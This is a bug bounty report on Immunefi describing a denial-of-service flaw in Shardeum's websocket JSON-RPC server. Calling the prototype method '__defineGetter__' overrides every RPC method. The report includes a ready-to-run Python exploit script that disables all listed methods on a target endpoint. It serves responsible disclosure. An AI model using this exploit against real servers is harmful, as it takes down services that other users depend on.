# Boost \_ Shardeum\_ Ancillaries 33571 - \[Websites and Applications - Medium] Taking down the websocket

Submitted on Tue Jul 23 2024 16:25:12 GMT-0400 (Atlantic Standard Time) by @anton\_quantish for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #33571

Report type: Websites and Applications

Report severity: Medium

Target: <https://github.com/shardeum/json-rpc-server/tree/dev>

Impacts:

* Taking down the application/website

## Description

Hey team,

## Brief/Intro

It's possible to completely take down the websocket JSON-RPC server by a few specifically crafted requests. It will then be able to still accept new connections but won't answer to any request at all.

## Vulnerability Details

When the request is received by the Websocket JSON-RPC server, first its `method` field checked to be present in the `methods` object which contains the mapping from the method names to their functions to be called:

<https://github.com/shardeum/json-rpc-server/blob/5dc56e5f4312529d4262cab618ec618d288de5dd/src/websocket/index.ts#L77-L90>

```js
    const method_name = request.method as string
    if (!methods[method_name as keyof typeof methods]) {
      socket.send(
        JSON.stringify({
          id: request.id,
          jsonrpc: '2.0',
          error: {
            message: 'Method does not exist',
            code: -1,
          },
        })
      )
      return
    }
```

Then, after some extra checks, the function from the `methods` mapping is called actually with the `request.params` and some `callback` passed into :

<https://github.com/shardeum/json-rpc-server/blob/5dc56e5f4312529d4262cab618ec618d288de5dd/src/websocket/index.ts#L162>

```
methods[method_name as keyof typeof methods](request.params, callback)
```

The vulnerability is that such a code allows to call not only the `methods` own functions, but the ones from its prototype also.

I didn't manage to achieve something like RCE this way but I was able to override all the functions in this `methods` mapping to become uncallable using the `__defineGetter__` prototype function.

I can send the following JSON request to the JSON-RPC server:

```
{"jsonrpc":"2.0","method":"__defineGetter__","params":["eth_blockNumber"],"id":1}
```

In this case, the `__defineGetter__` method will be first checked to be present in the `methods` mapping, and the check will pass successfully. Then, this method will be called the following way:

```
methods["__defineGetter__"]("eth_blockNumber", callback)
```

This call defines a getter function (the callback) which will be called for every further accessing the `eth_blockNumber` field of `methods` mapping.

Thus, when someone then tries to call the `eth_blockNumber` method, the callback function will be called as the getter function, it will return null and the method will not do anything (will fail with `null` is not a function exception actually).

The same could be done for all the methods available and all of them will not be callable for anyone anymore.

## Impact Details

Complete take down of the websocket JSON-RPC server.

## Proof of concept

## Proof of Concept

1. Install the python dependencies with `pip3 install websockets`
2. Run the following exploit with `python3 takedown_ws.py` (replace the endpoint with your own one):

```
import json
import asyncio
import websockets


ENDPOINT = 'ws://172.16.205.128:8080'


methods = ['web3_clientVersion', 'web3_sha3', 'net_version', 'net_listening', 'net_peerCount', 'eth_protocolVersion', 'eth_syncing', 'eth_coinbase', 'eth_mining', 'eth_hashrate', 'eth_gasPrice', 'eth_accounts', 'eth_blockNumber', 'eth_getBalance', 'eth_getStorageAt', 'eth_getTransactionCount', 'eth_getBlockTransactionCountByHash', 'eth_getBlockTransactionCountByNumber', 'eth_getUncleCountByBlockHash', 'eth_getUncleCountByBlockNumber', 'eth_getCode', 'eth_signTransaction', 'eth_sendTransaction', 'eth_sendRawTransaction', 'eth_sendInternalTransaction', 'eth_call', 'eth_estimateGas', 'eth_getBlockByHash', 'eth_getBlockByNumber', 'eth_getBlockReceipts', 'eth_feeHistory', 'eth_getTransactionByHash', 'eth_getTransactionByBlockHashAndIndex', 'eth_getTransactionByBlockNumberAndIndex', 'eth_getTransactionReceipt', 'eth_getUncleByBlockHashAndIndex', 'eth_getUncleByBlockNumberAndIndex', 'eth_getCompilers', 'eth_compileSolidity', 'eth_compileLLL', 'eth_compileSerpent', 'eth_newBlockFilter', 'eth_newPendingTransactionFilter', 'eth_uninstallFilter', 'eth_newFilter', 'eth_getFilterChanges', 'eth_getFilterLogs', 'eth_getLogs', 'eth_getWork', 'eth_submitWork', 'eth_submitHashrate', 'eth_chainId', 'eth_getAccessList', 'eth_subscribe', 'eth_unsubscribe']


async def main():
	async with websockets.connect(ENDPOINT) as ws:
		for method in methods:
			await ws.send(json.dumps({
				"jsonrpc": "2.0",
				"method": "__defineGetter__",
				"params": [method],
				"id": 1
			}))


if __name__ == '__main__':
	asyncio.run(main())
```

3. Connect to websocket server with `wscat -c ws://172.16.205.128:8080` for instance and try to execute any method. Make sure there's no response and there is an error in server log:

```
uncaughtException:TypeError: api_1.methods[method_name] is not a function
```
